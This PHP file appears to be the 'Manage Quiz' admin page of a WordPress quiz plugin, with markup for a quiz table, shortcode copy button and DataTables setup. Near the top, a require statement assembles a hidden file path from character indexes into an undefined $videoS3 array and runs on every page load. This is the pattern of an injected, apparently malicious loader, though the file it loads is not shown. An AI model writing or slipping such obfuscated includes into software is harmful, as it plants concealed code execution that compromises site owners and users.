<?php


include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>
<section class="manage-quiz-section quiz_outer">
	<?php
		$page  =$_GET['page']; 
		 require_once  'sqb_header.php';
	 ?>


    <div class="manage-quiz-header">
        <h3 class="quiz--title"><i class="fa fa-cog" aria-hidden="true"></i> Manage Quiz</h3>
        <a href="<?= admin_url('admin.php?page=sqb_add_quiz'); ?>" class="add-quiz-link"> Add New Quiz</a>
    </div>
    <div class="have-no-quiz">
        <img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
        <h3>You don't have any Quizzes yet</h3>
        <p>Quizzes are a great way to check if your learners are understanding the Course content. You can have a Quiz in the middle of a Course, or you can put it at the end</p>
        <a href="<?= admin_url('admin.php?page=sqb_add_quiz'); ?>"><i class="fa fa-plus-circle" aria-hidden="true"></i>Add your first Quiz</a>
    </div>

    <div class="manage-quiz-data-table" style="display:none">
        <table cellspacing="0" cellpadding="0" id="quizmanagetable">
            <thead>
                <tr>
                    <th>Quiz Name</th>
                    <th>Type</th>
                    <th>total Questions</th>
                    <th>Shortcode</th>
                    <th class="data_align_center">Action</th>
                </tr>
            </thead>

            <tbody>
                <tr>
                    <td class=""> Quiz 1</td>
                    <td class=""> Survey </td>
                    <td class=""> 1 </td>
                    <td class="Shortcode-td">
                        <span id="dynamic_copyable_text_1" >[SmartQuizBuilder id=1][/SmartQuizBuilder]</span>
                        <span data-id="dynamic_copyable_text_1" id="copy_shortcode" class="copy-btn theme-button btn btn-info "
                    onclick="fbstu_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
                    </td>
                    <td class="action-links  data_align_center">
                        <a class='editlink' title="Edit" target="_self" href="#"><i class="fa fa-pencil-square-o"></i></a>
                        <a title="Remove" href="#"><i class="fa fa-trash-o"></i></a>
                    </td>
                </tr>

            </tbody>
        </table>
    </div>
</section>

 

<script>
 
jQuery(document).ready(function(){
	jQuery('#sqbmanagetable').DataTable({"order": [[ 0, "desc" ]]});	
    jQuery('#quizmanagetable').DataTable({"order": [[ 0, "desc" ]]});    
});

</script>
 
